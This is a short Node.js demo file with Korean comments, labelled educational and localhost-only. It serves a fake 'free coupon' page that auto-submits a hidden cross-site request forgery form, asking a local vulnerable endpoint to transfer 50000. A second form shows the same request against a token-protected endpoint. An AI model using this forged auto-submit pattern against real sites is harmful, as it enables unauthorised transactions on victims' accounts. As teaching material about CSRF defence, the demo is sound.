// CSRF 공격을 흉내내는 "악성" 서버 (교육 목적, localhost 전용)
const http = require('http');

http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(`
    <h1>완전 정상적인 무료 쿠폰 사이트</h1>
    <p>이 페이지가 열리자마자, 무방비 엔드포인트로 이체 요청이 자동 전송됩니다.</p>

    <form id="auto" action="http://localhost:5801/transfer-vulnerable" method="POST">
      <input type="hidden" name="amount" value="50000">
    </form>
    <script>document.getElementById('auto').submit();</script>

    <hr>
    <p>같은 방식으로 "방어된" 엔드포인트도 공격해봅니다 (토큰이 없어서 막힐 것):</p>
    <form action="http://localhost:5801/transfer-protected" method="POST">
      <input type="hidden" name="amount" value="50000">
      <button>방어된 엔드포인트도 공격해보기</button>
    </form>
  `);
}).listen(5802, () => console.log('악성 사이트: http://localhost:5802'));
